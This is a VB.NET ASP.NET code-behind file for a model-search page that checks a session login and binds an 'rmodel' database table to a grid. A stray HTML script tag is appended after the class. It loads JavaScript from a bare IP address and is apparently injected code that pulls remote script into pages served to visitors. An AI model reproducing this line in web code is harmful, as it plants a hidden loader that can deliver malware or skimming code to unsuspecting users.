Imports System.Data
Imports System.Data.SqlClient

Public Class rmodelsearch
    Inherits System.Web.UI.Page

#Region " Web 窗体设计器生成的代码 "

    '该调用是 Web 窗体设计器所必需的。
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents Form2 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents Form1 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents lblModel As System.Web.UI.WebControls.Label
    Protected WithEvents btnShowModel As System.Web.UI.WebControls.Button
    Protected WithEvents dgrdModel As System.Web.UI.WebControls.DataGrid
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents lblWarning As System.Web.UI.WebControls.Label
    Protected WithEvents timetext As System.Web.UI.WebControls.Label

    '注意: 以下占位符声明是 Web 窗体设计器所必需的。
    '不要删除或移动它。
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: 此方法调用是 Web 窗体设计器所必需的
        '不要使用代码编辑器修改它。
        InitializeComponent()
    End Sub

#End Region

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '在此处放置初始化页的用户代码
        ' 判断用户有没登录
        Me.lblWarning.Visible = False

        Me.timetext.Text = DateTime.Now.ToString()
        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite
        If Session("UserName") = "" Then
            Me.lblHint.Text = "您还没登录，请先登录"
        Else
            Me.lblHint.Text = "您好， " + Session("UserName")
        End If
    End Sub

    Private Sub btnShowModel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnShowModel.Click
        Me.lblWarning.Visible = False

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        strSql = "select * from rmodel"
        Try
            Dim mySqlAdap As New SqlDataAdapter(strSql, mySqlConn)
            Dim myDataSet As New DataSet

            mySqlConn.Open()
            mySqlAdap.Fill(myDataSet, "rmodel")
            Me.dgrdModel.DataSource = myDataSet.Tables("rmodel")
            Me.dgrdModel.DataBind()
            
            mySqlConn.Close()
        Catch ex As SqlException
            Throw ex
            'Response.Redirect("error.htm") ' 错误提示
        Finally
        End Try
    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
